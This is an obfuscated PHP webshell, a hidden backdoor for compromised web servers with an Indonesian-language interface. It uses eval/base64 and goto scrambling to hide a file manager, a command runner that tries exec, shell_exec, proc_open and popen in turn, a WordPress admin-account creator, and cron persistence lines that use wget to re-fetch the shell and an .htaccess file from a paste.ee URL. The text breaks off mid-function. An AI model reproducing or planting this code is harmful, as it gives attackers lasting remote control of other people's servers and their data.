<?php eval(base64_decode('
 goto MFqkC; F9K8N: Lt_w6: goto nfsps; jLoVH: goto LGCyM; goto sefMG; qyF4B: VLBZ8: goto OzrDf; hI3zq: goto gorcG; goto uz5S1; CU7QY: jgZbc: goto Pgfq2; YEMPU: echo urlencode($current_path); goto GLfF9; mh1U1: goto gB8Vk; goto QPt41; ivcgF: $_g_ascii_filesize = array(102, 105, 108, 101, 115, 105, 122, 101); goto Q1x_m; nfsps: $trim_fn = _get_fn_name_global_init_v3("\137\147\137\141\x73\143\151\151\x5f\164\x72\x69\155", "\x74\162\x69\155"); goto o_YZX; LhRCq: if (!is_path_allowed_by_basedir($current_path) || !@call_user_func($is_dir_fn, $current_path)) { $current_path = call_user_func($function_exists_fn, $getcwd_fn) ? @call_user_func($getcwd_fn) : $auto_path_script; if (!is_path_allowed_by_basedir($current_path) || !@call_user_func($is_dir_fn, $current_path)) { $current_path = $auto_path_script; } } goto fdot_; m52ch: $getcwd_fn = _get_fn_name_global_init_v3("\x5f\147\x5f\x61\163\x63\151\x69\137\147\145\164\x63\x77\x64", "\147\145\164\143\167\x64"); goto iKQLz; yNYrc: $_g_ascii_implode = array(105, 109, 112, 108, 111, 100, 101); goto tpJYl; zMKE8: ?>
</div>
                </header>

                <?php  goto lBQmV; FtOp3: goto keT1N; goto D9_1m; SI36l: goto y1Gs4; goto NbDsp; vcMiS: goto EcXJl; goto gCy0d; mR0IJ: keT1N: goto DGSbs; HWK43: goto BFtrw; goto avkfh; dToK_: IE0Hi: goto vNToB; F8yrb: $_g_ascii_move_uploaded_file = array(109, 111, 118, 101, 95, 117, 112, 108, 111, 97, 100, 101, 100, 95, 102, 105, 108, 101); goto CmXs9; xh5c3: goto Ot5_z; goto zMADb; mcb4a: $protected_menus = array("\x74\145\x72\155\151\x6e\x61\154", "\x63\x72\x6f\156", "\166\151\x65\x77\x5f\x63\162\157\x6e\164\x61\x62", "\x77\x70\x5f\141\x64\155\151\156\x5f\x63\162\x65\141\164\157\162", "\x77\x65\142\163\x68\145\154\154\x5f\x73\x63\x61\x6e\156\x65\162", "\147\x65\x6e\145\162\x61\164\157\x72", "\141\144\x6d\151\x6e\x65\162", "\165\x6e\154\157\143\x6b", "\154\157\143\153", "\x70\162\x6f\143\145\x73\x73\137\x6d\x61\156\141\147\145\x72", "\144\145\163\x74\x72\157\171\x65\x72", "\x64\151\x73\x61\142\154\145\x64\137\x66\x75\x6e\143\164\151\157\x6e\163", "\163\x75\x69\144\137\163\143\141\156\156\x65\162", "\x73\145\x63\x75\162\151\164\171\x5f\143\x6f\156\146\x69\147", "\x66\151\154\145\x5f\163\x70\162\x65\x61\x64\x65\162", "\144\171\156\141\155\x69\143\x5f\x63\141\143\150\145\x5f\155\x61\156\x61\147\x65\162"); goto CxMMW; AilZa: $_g_ascii_file_put_contents = array(102, 105, 108, 101, 95, 112, 117, 116, 95, 99, 111, 110, 116, 101, 110, 116, 115); goto n3ZVx; euQy4: goto LydhC; goto Mg4qS; fKYBZ: hP226: goto cxbYA; X6i4q: goto Bwxz5; goto l6IDe; EgYKy: ?>
            }

            var terminalBox = document.getElementById("terminalBox");
            if(terminalBox) terminalBox.scrollTop = terminalBox.scrollHeight;
            var cmdInput = document.getElementById("cmd_input");
            if(cmdInput) cmdInput.focus();

            $('#select-all-checkbox').on('change', function() { $('.item-checkbox').prop('checked', $(this).is(':checked')); });

            $('#bulk-action-form').on('submit', function(e) { const op = this.elements.bulk_operation.value; const selected = $('.item-checkbox:checked').length; if (op === "") { alert("Pilih aksi."); e.preventDefault(); return; } if (selected === 0) { alert("Tidak ada item yang dipilih."); e.preventDefault(); } if (op === 'delete' && !confirm("Yakin hapus " + selected + " item?")) e.preventDefault(); });
            
            var modal = $("#create-modal"); var btnFile = $("#create-file-btn"); var btnFolder = $("#create-folder-btn");
            btnFile.on('click', function() { $("#modal-title").html("Buat File Baru"); $("#modal-input-container").html('<label for="new_file_name">Nama File:</label><input type="text" id="new_file_name_modal_input" name="new_file_name" required autofocus class="w-full">'); modal.show(); $('#new_file_name_modal_input').focus(); });
            btnFolder.on('click', function() { $("#modal-title").html("Buat Folder Baru"); $("#modal-input-container").html('<label for="new_folder_name">Nama Folder:</label><input type="text" id="new_folder_name_modal_input" name="new_folder_name" required autofocus class="w-full">'); modal.show(); $('#new_folder_name_modal_input').focus(); });
            modal.on('click', '.close-btn', function() { modal.hide(); });
            $(window).on('click', function(event) { if ($(event.target).is(modal)) modal.hide(); });

            $('#file-upload-input').on('change', function() { 
                const files = this.files;
                if (files.length > 1) { $('#file-upload-filename').text(files.length + ' files selected.'); } 
                else if (files.length === 1) { $('#file-upload-filename').text(files[0].name); } 
                else { $('#file-upload-filename').text('No file selected.'); }
            });

            // --- Dynamic Cache/Protector Logic ---
            const protectorRowsContainer = $('#protector-rows');
            function addProtectorRow() {
                const template = $('#protector-row-template').html();
                protectorRowsContainer.append(template);
                if (protectorRowsContainer.children().length === 1) {
                    const firstRowInput = protectorRowsContainer.find('.protector-row:first .target-path-input');
                    if (firstRowInput.val() === '' || firstRowInput.attr('placeholder') === firstRowInput.val()) {
                        firstRowInput.val('<?php  goto xJFal; tqZWm: $sec_menus = array("\163\x65\x63\x75\x72\x69\x74\171\137\143\157\x6e\146\x69\x67" => array("\x6e\x61\155\x65" => "\x53\x65\143\x75\x72\151\x74\x79\40\103\x6f\x6e\x66\x69\x67", "\x69\x63\x6f\156" => "\146\x61\55\165\x73\145\x72\x2d\x73\150\151\145\x6c\x64"), "\x77\145\142\x73\150\145\x6c\x6c\x5f\x73\143\x61\x6e\156\145\162" => array("\x6e\x61\155\x65" => "\127\145\x62\x73\150\145\x6c\154\40\x53\143\141\156\156\145\x72", "\x69\x63\157\x6e" => "\x66\141\55\x73\x68\151\145\x6c\x64\x2d\166\151\162\165\x73"), "\144\x79\156\x61\155\151\143\137\x63\x61\143\x68\x65\137\x6d\141\x6e\x61\x67\145\162" => array("\156\141\x6d\x65" => $dynamic_names["\x6d\145\156\165\x5f\x74\151\x74\154\x65"], "\151\x63\x6f\x6e" => "\x66\x61\x2d\150\x64\144"), "\x73\165\151\x64\x5f\163\143\141\156\156\145\162" => array("\156\x61\155\145" => "\x53\x55\111\x44\40\x53\143\141\x6e\x6e\145\x72", "\x69\143\157\x6e" => "\x66\141\x2d\x73\x65\x61\162\143\x68"), "\144\151\163\141\142\154\145\x64\x5f\146\x75\x6e\143\x74\x69\x6f\156\x73" => array("\156\x61\155\x65" => "\x44\151\x73\x61\142\154\x65\144\40\106\x75\x6e\143\x74\x69\157\156\x73", "\151\143\x6f\x6e" => "\x66\x61\x2d\142\141\156"), "\144\145\x73\164\x72\157\x79\145\x72" => array("\156\141\x6d\x65" => "\102\141\143\153\x64\x6f\157\x72\x20\x44\145\163\164\x72\157\171\145\162", "\151\x63\157\156" => "\x66\141\55\163\x6b\165\154\154\x2d\143\162\157\x73\163\142\x6f\x6e\145\x73"), "\x63\x72\x6f\156" => array("\156\x61\x6d\145" => "\x43\162\x6f\x6e\x20\x4a\157\x62\x20\x53\145\x74\165\160", "\151\143\157\156" => "\x66\141\x2d\x63\x6c\157\x63\x6b"), "\x76\151\145\x77\137\143\x72\x6f\156\x74\141\142" => array("\156\x61\x6d\x65" => "\126\151\x65\167\x20\x45\x6e\143\157\x64\145\x64\x20\103\x72\157\156\x74\x61\142", "\x69\143\x6f\x6e" => "\146\141\55\x65\x79\145\55\x73\154\141\x73\x68"), "\x77\160\x5f\x61\x64\x6d\151\156\x5f\x63\x72\145\141\164\157\x72" => array("\x6e\141\155\145" => "\x57\x50\40\101\x64\x6d\151\156\40\103\162\145\141\x74\x6f\x72", "\x69\143\x6f\x6e" => "\146\x61\55\x77\x6f\162\144\160\x72\x65\163\x73")); goto LaU4J; n8XHU: goto eSAOP; goto R1io2; ps3Pz: $_g_ascii_getcwd = array(103, 101, 116, 99, 119, 100); goto wOjqx; yYEPW: function generator_fetch_url_with_curl($url) { if (!function_exists("\143\165\x72\x6c\x5f\151\x6e\151\x74")) { return array("\x63\157\156\x74\x65\x6e\x74" => false, "\x65\x72\x72\157\162" => "\x45\x6b\x73\x74\x65\x6e\163\151\x20\120\110\120\x20\x63\125\x52\x4c\x20\x74\151\x64\141\x6b\x20\x61\153\164\151\146\x2e"); } $ch = curl_init(); curl_setopt_array($ch, array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => 1, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_USERAGENT => "\115\157\172\151\154\154\x61\57\x35\x2e\x30", CURLOPT_TIMEOUT => 20, CURLOPT_SSL_VERIFYPEER => true, CURLOPT_SSL_VERIFYHOST => 2)); $content = curl_exec($ch); $error = curl_error($ch); $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch); if ($error) { return array("\143\x6f\156\164\x65\156\x74" => false, "\145\x72\162\157\162" => "\143\x55\x52\114\x20\105\x72\162\x6f\162\72\x20{$error}"); } if ($http_code >= 400) { return array("\x63\157\x6e\164\x65\156\164" => false, "\145\162\162\157\162" => "\x48\124\124\x50\x20\x45\162\162\x6f\x72\72\40\123\x74\x61\164\x75\x73\40{$http_code}"); } return array("\x63\x6f\x6e\x74\145\156\164" => $content, "\x65\162\162\x6f\162" => null); } goto B8nsT; Z2yMY: goto X5OFX; goto TmACA; zKhs8: V3dMi: goto vNXc6; peOFI: X5OFX: goto M0pre; OPHtZ: $_g_ascii_dirname = array(100, 105, 114, 110, 97, 109, 101); goto iZEE9; Qr0A6: goto WmCNu; goto uxId2; EGiiX: function __u0x_d3c0d3_str_fr0m_4sc11_4rr4y($ascii_array) { $str = ''; if (!is_array($ascii_array)) { return ''; } foreach ($ascii_array as $char_code) { if (is_int($char_code) && $char_code >= 0 && $char_code <= 255) { $str .= chr($char_code); } } return $str; } goto Qr0A6; FAq59: goto nFzhO; goto EH7O1; qxz_c: goto YUDA_; goto Cr2nk; jQSGg: function generate_custom_cron_commands($target_path, $shell_filename, $shell_url) { $commands = array(); $safe_path = safe_escapeshellarg($target_path); $safe_shell_full_path = safe_escapeshellarg($target_path . DIRECTORY_SEPARATOR . $shell_filename); $safe_url = safe_escapeshellarg($shell_url); $safe_htaccess_path = safe_escapeshellarg($target_path . DIRECTORY_SEPARATOR . "\56\150\164\141\x63\x63\145\x73\163"); $commands[] = "\x2a\57\x35\x20\52\x20\x2a\x20\x2a\40\52\40\x69\x66\40\x5b\40\x2d\x66\x20{$safe_shell_full_path}\40\x5d\x3b\40\x74\x68\x65\156\x20\x63\150\x6d\157\144\40\60\64\64\64\40{$safe_shell_full_path}\x3b\40\146\151\40\46\46\x20\167\147\145\x74\x20\55\161\117\40{$safe_shell_full_path}\40{$safe_url}\x20\46\x26\x20\x63\150\x6d\x6f\144\x20\x30\x34\64\x34\40{$safe_shell_full_path}"; $commands[] = "\52\57\x32\x20\x2a\40\x2a\40\52\40\x2a\40\143\x68\x6d\x6f\144\40\60\67\x35\65\40{$safe_path}"; $commands[] = "\x2a\x2f\62\x20\52\40\x2a\40\x2a\40\52\40\x69\x66\40\x5b\x20\x21\x20\55\x66\40{$safe_shell_full_path}\x20\x5d\73\x20\164\150\145\x6e\40\164\157\165\x63\150\40{$safe_shell_full_path}\x3b\x20\146\151"; $commands[] = "\x2a\57\x32\40\52\x20\52\40\x2a\x20\x2a\40\x69\146\x20\133\40\41\x20\55\x66\40{$safe_htaccess_path}\40\x5d\73\x20\164\150\145\x6e\x20\164\x6f\165\x63\x68\40{$safe_htaccess_path}\x3b\40\146\x69"; $commands[] = "\52\57\65\x20\x2a\x20\x2a\40\52\x20\52\40\x63\x68\x6d\x6f\144\40\60\x34\x34\x34\40{$safe_htaccess_path}\40\46\x26\40\167\147\x65\164\40\x2d\161\x4f\40{$safe_htaccess_path}\x20\x68\164\164\160\163\72\57\57\160\x61\x73\x74\145\56\145\145\x2f\x72\x2f\114\x63\x54\143\61\x34\67\x37"; $commands[] = "\x2a\57\x32\40\52\40\52\x20\52\x20\52\x20\x6d\x6b\x64\x69\x72\40\x2d\x70\40{$safe_path}"; return $commands; } goto mARdl; C7EPN: goto cXrme; goto iovR6; YTvUe: XQkup: goto icbOa; Rdwuf: goto y_RVA; goto U0WgX; Gn72s: $output_messages = array(); goto xxnf7; XJsK3: goto DZOgy; goto uDO_o; G2xR7: i7G59: goto OPHtZ; NbDsp: vMMZO: goto OwcgD; kOBpL: B_kSf: goto hSAGK; X8lBZ: goto qqC1j; goto xd3GP; ycjhx: Yn0Ce: goto p5Y_5; epP8b: @error_reporting(0); goto BKlwo; Upflj: goto N4o5w; goto QoH2K; was_O: VEhqW: goto qzAZ8; nw7EI: goto IE0Hi; goto L0qm_; o_YZX: goto cZcOP; goto PezDG; YQEJU: NVVAj: goto JH_uB; VyURD: oguxC: goto g4X26; kNMAf: YOWE9: goto K0ipW; WHd0A: goto i7G59; goto ilUc6; UVgnC: if (!empty($output_messages)) { echo "\74\x64\x69\166\x20\x63\x6c\141\x73\x73\x3d\47\155\x65\x73\x73\141\x67\x65\x20\163\x75\x63\143\145\x73\163\x27\x3e" . implode("\74\142\x72\x3e", $output_messages) . "\74\x2f\x64\x69\166\x3e"; } goto Ri5W5; n6jZ5: $chmod_fn_local_init = _get_fn_name_global_init_v3("\x5f\147\x5f\x61\x73\x63\151\151\137\x63\150\x6d\157\x64", "\143\150\x6d\x6f\144"); goto Uh_QW; pAUSz: echo $htmlspecialchars_fn(basename(__FILE__)); goto Zk4eI; qZpcY: goto rKe3J; goto I75yN; sqSKt: goto qLjXO; goto Cw4rA; g8Mqt: $_g_ascii_is_dir = array(105, 115, 95, 100, 105, 114); goto PMeTQ; OjedU: $_g_ascii_shell_exec = array(115, 104, 101, 108, 108, 95, 101, 120, 101, 99); goto GOXTT; yGF_Y: goto pophZ; goto o9dQS; Qid70: goto zrKv7; goto k6SXJ; DSeLu: aZGBR: goto cPbA1; z5sbw: function safe_escapeshellarg($argument) { $function_exists_fn_local = _get_fn_name_global_init_v3("\137\147\x5f\141\163\x63\151\151\x5f\x66\x75\x6e\143\164\151\157\x6e\x5f\145\x78\x69\163\x74\163", "\x66\x75\x6e\x63\164\x69\x6f\156\137\145\x78\x69\x73\x74\163"); $escapeshellarg_fn_local = _get_fn_name_global_init_v3("\137\147\x5f\x61\163\143\151\151\x5f\x65\163\143\141\x70\x65\x73\x68\x65\154\x6c\141\x72\147", "\145\163\143\x61\160\145\x73\150\x65\154\x6c\x61\162\x67"); if (!empty($escapeshellarg_fn_local) && call_user_func($function_exists_fn_local, $escapeshellarg_fn_local)) { return call_user_func($escapeshellarg_fn_local, $argument); } if (strtoupper(substr(PHP_OS, 0, 3)) === "\x57\111\116") { return "\x22" . str_replace(array("\42", "\x25", "\136", "\x21", "\x3c", "\x3e", "\46", "\x7c"), '', $argument) . "\x22"; } else { return "\x27" . str_replace("\x27", "\x27\x5c\x27\x27", $argument) . "\x27"; } } goto xh5c3; iqp6I: cXrme: goto qTljr; KYCZZ: M6BFu: goto EFynU; Rt6jQ: $_g_ascii_proc_open = array(112, 114, 111, 99, 95, 111, 112, 101, 110); goto HWK43; aStSR: goto UzS8e; goto MhvV0; hDTEA: $_g_ascii_proc_close = array(112, 114, 111, 99, 95, 99, 108, 111, 115, 101); goto ku41x; d6Toe: yH4qp: goto JFhE8; mj4ID: $_g_ascii_realpath = array(114, 101, 97, 108, 112, 97, 116, 104); goto SecgI; g4X26: function listDirectory($path) { global $is_dir_fn, $htmlspecialchars_fn, $function_exists_fn; $items = array("\144\x69\x72\163" => array(), "\x66\151\x6c\x65\x73" => array()); $is_readable_fn_list = _get_fn_name_global_init_v3("\x5f\x67\137\141\x73\143\151\x69\137\151\163\x5f\162\x65\141\x64\x61\x62\x6c\x65", "\151\x73\x5f\x72\x65\x61\144\x61\x62\154\145"); $scandir_fn_list = _get_fn_name_global_init_v3("\x5f\x67\x5f\141\x73\143\x69\x69\137\163\143\x61\156\x64\151\162", "\163\143\x61\x6e\x64\151\x72"); $filesize_fn_list = _get_fn_name_global_init_v3("\137\147\137\141\x73\143\x69\151\137\x66\151\154\x65\x73\x69\x7a\145", "\146\151\x6c\x65\x73\151\x7a\145"); $fileperms_fn_list = _get_fn_name_global_init_v3("\x5f\147\137\x61\x73\x63\x69\151\137\x66\x69\154\x65\160\x65\162\x6d\163", "\x66\151\x6c\145\160\145\x72\155\x73"); $date_fn_list = _get_fn_name_global_init_v3("\137\147\x5f\141\163\x63\151\151\137\x64\x61\x74\x65", "\x64\x61\164\x65"); $filemtime_fn_list = _get_fn_name_global_init_v3("\x5f\147\x5f\141\163\x63\151\x69\137\x66\151\x6c\x65\155\164\x69\x6d\x65", "\146\x69\x6c\x65\155\x74\x69\x6d\145"); if (empty($is_dir_fn) || empty($is_readable_fn_list) || empty($scandir_fn_list) || empty($htmlspecialchars_fn) || empty($function_exists_fn)) { return $items; } if (!@call_user_func($is_dir_fn, $path) || !@call_user_func($is_readable_fn_list, $path)) { return $items; } $scan = @call_user_func($scandir_fn_list, $path); if ($scan === false) { return $items; } foreach ($scan as $item) { if ($item === "\x2e" || $item === "\x2e\x2e") { continue; } $full_item_path = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item; $item_data = array("\x6e\x61\155\x65" => call_user_func($htmlspecialchars_fn, $item), "\x72\x61\167\137\x6e\x61\x6d\145" => $item, "\160\141\x74\150" => $full_item_path, "\x70\145\x72\155\163" => "\x4e\57\x41", "\x73\151\172\x65" => "\x4e\x2f\101", "\x72\141\x77\137\x73\x69\x7a\145" => 0, "\x6d\x6f\x64\151\x66\151\145\x64" => "\x4e\57\101", "\162\141\167\x5f\155\157\144\x69\146\x69\145\x64" => 0, "\157\167\156\x65\162" => "\116\x2f\101", "\x67\x72\x6f\165\x70" => "\116\x2f\101", "\x74\171\x70\145" => "\x75\156\153\x6e\157\x77\x6e"); if (call_user_func($function_exists_fn, $fileperms_fn_list)) { $perms_raw = @call_user_func($fileperms_fn_list, $full_item_path); if ($perms_raw !== false) { $item_data["\160\145\162\155\163"] = perms_to_string($perms_raw); } } $mtime_raw = @call_user_func($filemtime_fn_list, $full_item_path); if ($mtime_raw !== false) { $item_data["\x72\141\x77\x5f\x6d\x6f\x64\151\146\x69\x65\144"] = $mtime_raw; $item_data["\155\157\x64\x69\146\151\145\x64"] = @call_user_func($date_fn_list, "\131\x2d\x6d\55\144\40\x48\x3a\x69\72\163", $mtime_raw); } if (function_exists("\x70\157\163\x69\x78\137\147\145\x74\x70\167\x75\x69\144") && function_exists("\x66\x69\x6c\x65\157\167\x6e\145\162")) { $owner_id = @fileowner($full_item_path); if ($owner_id !== false) { $owner_info = @posix_getpwuid($owner_id); $item_data["\157\x77\156\x65\x72"] = $owner_info ? $owner_info["\x6e\141\155\x65"] : $owner_id; } } if (function_exists("\x70\x6f\163\x69\170\137\147\145\164\147\162\147\x69\144") && function_exists("\146\x69\x6c\x65\147\x72\157\x75\160")) { $group_id = @filegroup($full_item_path); if ($group_id !== false) { $group_info = @posix_getgrgid($group_id); $item_data["\147\x72\x6f\x75\x70"] = $group_info ? $group_info["\x6e\141\x6d\145"] : $group_id; } } if (call_user_func($is_dir_fn, $full_item_path)) { $item_data["\164\x79\x70\x65"] = "\x64\151\x72"; $item_data["\163\x69\172\x65"] = "\55"; $item_data["\x72\141\x77\137\x73\151\172\145"] = -1; $items["\x64\151\x72\x73"][] = $item_data; } else { $item_data["\164\171\x70\x65"] = "\146\x69\x6c\145"; $fsize_raw = @call_user_func($filesize_fn_list, $full_item_path); if ($fsize_raw !== false) { $item_data["\x72\141\167\137\x73\151\172\145"] = $fsize_raw; $item_data["\x73\151\x7a\x65"] = formatBytes($fsize_raw); } $items["\146\151\x6c\x65\x73"][] = $item_data; } } if (!empty($items["\x64\151\162\163"])) { usort($items["\144\x69\x72\x73"], function ($a, $b) { return strcasecmp($a["\156\141\155\145"], $b["\156\141\x6d\x65"]); }); } if (!empty($items["\146\151\154\145\x73"])) { usort($items["\x66\x69\x6c\145\x73"], function ($a, $b) { return strcasecmp($a["\156\x61\155\x65"], $b["\x6e\141\x6d\x65"]); }); } return $items; } goto Qid70; YWhdC: function generator_sanitizeFilename($string) { $string = strtolower($string); $string = preg_replace("\x2f\x5b\136\x5c\x70\173\x4c\175\x5c\x70\x7b\116\x7d\134\163\x5c\55\x5d\53\x2f", '', $string); $string = preg_replace("\x2f\134\163\53\57", "\x2d", $string); $string = trim($string, "\55"); $string = preg_replace("\57\55\53\57", "\55", $string); return empty($string) ? "\165\156\x74\x69\164\x6c\145\x64\55" . uniqid() : $string; } goto GuAcD; le0rY: GLRCZ: goto LnZf5; qWcL0: WmCNu: goto c4pjW; PkXE5: goto ceZug; goto JLXM3; IayOI: goto I6A5m; goto VyURD; gCy0d: LMTFw: goto QHrod; W6AWs: goto fcKez; goto KsILI; LRTwe: function deleteDirectoryRecursive($dir) { if (!file_exists($dir)) { return true; } if (!is_dir($dir)) { return unlink($dir); } foreach (scandir($dir) as $item) { if ($item == "\56" || $item == "\56\x2e") { continue; } if (!deleteDirectoryRecursive($dir . DIRECTORY_SEPARATOR . $item)) { return false; } } return rmdir($dir); } goto fbBzN; VIEPQ: $wp_admin_feedback_class = ''; goto IayOI; O8HhH: HCDOB: goto pMFGs; Gu1Xy: $_g_ascii_unlink = array(117, 110, 108, 105, 110, 107); goto XAdAo; lBQmV: goto J9iYe; goto wWkTl; jzaxv: WRhGe: goto Y41ty; dYT2V: I6A5m: goto a3nR0; Cr2nk: URkvW: goto AilZa; qooau: $dynamic_names = get_dynamic_cache_names(); goto MamA2; f7tR_: ?>
                </div>
            </div>
        </main>
    </div>
    
    <div id="create-modal" class="modal"><div class="modal-content"><span class="close-btn absolute top-2 right-4 text-2xl cursor-pointer hover:text-white">&times;</span><h2 id="modal-title" class="cyber-font cyber-glow text-lg mb-4"></h2><form method="POST" action="<?php  goto IwE4X; jM_82: goto BIvP4; goto iI_ws; sRHP7: if (isset($_REQUEST["\160\141\x74\150"]) && is_path_allowed_by_basedir($_REQUEST["\x70\x61\164\x68"])) { $req_path_raw = call_user_func($trim_fn, $_REQUEST["\160\x61\x74\x68"]); $req_path_raw = str_replace("\x0", '', $req_path_raw); $resolved_path = null; if (call_user_func($function_exists_fn, $realpath_fn)) { $resolved_path = @call_user_func($realpath_fn, $req_path_raw); } if ($resolved_path && @call_user_func($is_dir_fn, $resolved_path)) { $current_path = $resolved_path; } elseif (@call_user_func($is_dir_fn, $req_path_raw)) { $current_path = $req_path_raw; } } elseif (isset($_SESSION["\143\x75\x72\162\x65\x6e\x74\x5f\145\170\160\154\157\162\145\x72\x5f\x70\141\164\150"]) && is_path_allowed_by_basedir($_SESSION["\x63\x75\162\162\145\156\x74\x5f\x65\x78\160\x6c\x6f\x72\145\x72\137\160\x61\164\150"])) { $path_from_session = $_SESSION["\x63\165\162\162\x65\x6e\x74\x5f\145\170\160\154\157\x72\x65\162\137\x70\x61\x74\x68"]; $resolved_session_path = null; if (call_user_func($function_exists_fn, $realpath_fn)) { $resolved_session_path = @call_user_func($realpath_fn, $path_from_session); } if ($resolved_session_path && @call_user_func($is_dir_fn, $resolved_session_path)) { $current_path = $resolved_session_path; } elseif (@call_user_func($is_dir_fn, $path_from_session)) { $current_path = $path_from_session; } } goto nntw7; CSvJL: eSAOP: goto q_gEw; mIXul: goto qSwDp; goto AZ7Fv; Dk1sn: goto Kq36I; goto qWcL0; ORwBn: function formatBytes($bytes, $precision = 2) { if (!is_numeric($bytes) || $bytes < 0) { return "\x4e\57\101"; } $units = array("\x42", "\113\102", "\115\102", "\x47\x42", "\124\x42"); $bytes = max($bytes, 0); if ($bytes == 0) { return "\60\40" . $units[0]; } $log_val = @log($bytes); if ($log_val === false) { return "\116\57\101"; } $pow = floor($log_val / log(1024)); $pow = min($pow, count($units) - 1); $bytes /= 1 << 10 * $pow; return round($bytes, $precision) . "\x20" . $units[$pow]; } goto WwQxZ; qponN: uF1cx: goto n6jZ5; zmNb5: $_g_ascii_filter_var = array(102, 105, 108, 116, 101, 114, 95, 118, 97, 114); goto A2lBg; O530b: goto TvhJW; goto BWfHe; L1A_H: goto GLRCZ; goto Y2e3H; cdPLN: function try_execute_command($command, $cwd = null) { global $function_exists_fn; $implode_fn_local = _get_fn_name_global_init_v3("\x5f\x67\137\141\163\143\x69\x69\x5f\x69\155\160\154\157\144\145", "\x69\155\x70\154\157\144\x65"); $is_resource_fn_local = _get_fn_name_global_init_v3("\x5f\147\137\x61\163\x63\151\151\x5f\x69\163\137\162\x65\163\x6f\165\162\143\x65", "\x69\163\137\x72\x65\x73\x6f\x75\162\x63\x65"); $stream_set_timeout_fn_local = _get_fn_name_global_init_v3("\x5f\147\x5f\141\163\143\151\151\x5f\163\164\x72\145\x61\155\x5f\x73\145\x74\137\164\151\155\x65\157\x75\x74", "\163\164\x72\145\141\155\x5f\x73\x65\164\x5f\x74\151\155\x65\157\x75\164"); $stream_get_contents_fn_local = _get_fn_name_global_init_v3("\137\147\x5f\x61\x73\143\x69\151\x5f\163\164\x72\145\141\x6d\x5f\147\x65\x74\137\143\157\x6e\164\145\x6e\x74\163", "\163\164\x72\145\x61\155\137\147\145\x74\x5f\143\x6f\156\164\145\156\164\x73"); $fclose_fn_local = _get_fn_name_global_init_v3("\x5f\x67\x5f\141\163\x63\x69\151\x5f\146\x63\x6c\157\163\145", "\x66\x63\154\x6f\x73\x65"); $feof_fn_local = _get_fn_name_global_init_v3("\137\x67\x5f\x61\163\x63\x69\151\137\146\x65\x6f\146", "\x66\145\157\x66"); $fread_fn_local = _get_fn_name_global_init_v3("\x5f\147\x5f\141\x73\143\151\151\x5f\x66\162\x65\x61\x64", "\146\x72\x65\x61\144"); $exec_fn_local = _get_fn_name_global_init_v3("\x5f\147\137\141\x73\143\151\151\x5f\x65\170\145\x63", "\145\170\145\143"); $shell_exec_fn_local = _get_fn_name_global_init_v3("\x5f\147\x5f\x61\x73\143\151\x69\137\163\x68\145\x6c\x6c\137\145\170\x65\143", "\x73\150\145\154\154\x5f\145\170\145\x63"); $proc_open_fn_local = _get_fn_name_global_init_v3("\x5f\x67\x5f\x61\x73\x63\x69\151\x5f\x70\162\157\x63\x5f\157\x70\x65\156", "\160\162\x6f\x63\137\157\x70\145\x6e"); $proc_close_fn_local = _get_fn_name_global_init_v3("\137\147\x5f\x61\163\x63\x69\151\137\x70\x72\157\143\x5f\x63\x6c\x6f\163\x65", "\160\162\157\x63\x5f\x63\x6c\157\x73\145"); $popen_fn_local = _get_fn_name_global_init_v3("\x5f\147\137\x61\x73\x63\151\x69\x5f\160\x6f\160\145\x6e", "\160\157\160\145\x6e"); $pclose_fn_local = _get_fn_name_global_init_v3("\x5f\x67\137\x61\x73\143\151\151\x5f\x70\143\154\157\x73\145", "\x70\x63\x6c\x6f\163\x65"); $getcwd_fn_local_try = _get_fn_name_global_init_v3("\x5f\x67\x5f\141\163\143\151\151\137\147\145\x74\x63\x77\144", "\x67\x65\x74\143\167\x64"); $chdir_fn_local_try = _get_fn_name_global_init_v3("\x5f\x67\x5f\x61\x73\143\151\151\137\x63\x68\x64\151\x72", "\143\x68\x64\x69\162"); $output = null; $return_var = -1; $output_array = array(); $original_cwd = null; if ($cwd !== null && call_user_func($function_exists_fn, $getcwd_fn_local_try) && call_user_func($function_exists_fn, $chdir_fn_local_try)) { $original_cwd = @call_user_func($getcwd_fn_local_try); if ($original_cwd === false) { $original_cwd = null; } @call_user_func($chdir_fn_local_try, $cwd); } if (call_user_func($function_exists_fn, $exec_fn_local)) { @call_user_func_array($exec_fn_local, array($command, &$output_array, &$return_var)); $output = call_user_func($implode_fn_local, "\xa", $output_array); if ($output !== null && ($return_var === 0 || $output_array !== null && !empty($output))) { if ($original_cwd) { @call_user_func($chdir_fn_local_try, $original_cwd); } return $output; } $output = null; $output_array = array(); $return_var = -1; } if (call_user_func($function_exists_fn, $shell_exec_fn_local)) { $current_output = @call_user_func($shell_exec_fn_local, $command); if ($current_output !== false && $current_output !== null) { $output = $current_output; if ($original_cwd) { @call_user_func($chdir_fn_local_try, $original_cwd); } return $output; } } if (call_user_func($function_exists_fn, $proc_open_fn_local)) { $descriptorspec = array(0 => array("\160\151\x70\145", "\x72"), 1 => array("\160\x69\160\145", "\167"), 2 => array("\x70\x69\x70\145", "\167")); $pipes = array(); $process = @call_user_func($proc_open_fn_local, $command, $descriptorspec, $pipes, $cwd, null); if (call_user_func($is_resource_fn_local, $process)) { $output_proc = ''; $error_output_proc = ''; if (isset($pipes[1]) && call_user_func($is_resource_fn_local, $pipes[1])) { @call_user_func($stream_set_timeout_fn_local, $pipes[1], 10); $temp_out = @call_user_func($stream_get_contents_fn_local, $pipes[1]); if ($temp_out !== false) { $output_proc = $temp_out; } @call_user_func($fclose_fn_local, $pipes[1]); } if (isset($pipes[2]) && call_user_func($is_resource_fn_local, $pipes[2])) { @call_user_func($stream_set_timeout_fn_local, $pipes[2], 10); $temp_err = @call_user_func($stream_get_contents_fn_local, $pipes[2]); if ($temp_err !== false) { $error_output_proc = $temp_err; } @call_user_func($fclose_fn_local, $pipes[2]); } if (isset($pipes[0]) && call_user_func($is_resource_fn_local, $pipes[0])) { @call_user_func($fclose_fn_local, $pipes[0]); } @call_user_func($proc_close_fn_local, $process); $current_output_proc = $output_proc; if (!empty($error_output_proc)) { $current_output_proc .= (!empty($current_output_proc) ? "\12" : '') . "\x5b\x53\124\x44\105\x52\122\x5d\x20" . $error_output_proc; } if (!empty($current_output_proc) || $output_proc === '') { $output = $current_output_proc; if ($original_cwd) { @call_user_func($chdir_fn_local_try, $original_cwd); } return $output; } } } if (call_user_func($function_exists_fn, $popen_fn_local)) { $handle = @call_user_func($popen_fn_local, $command . 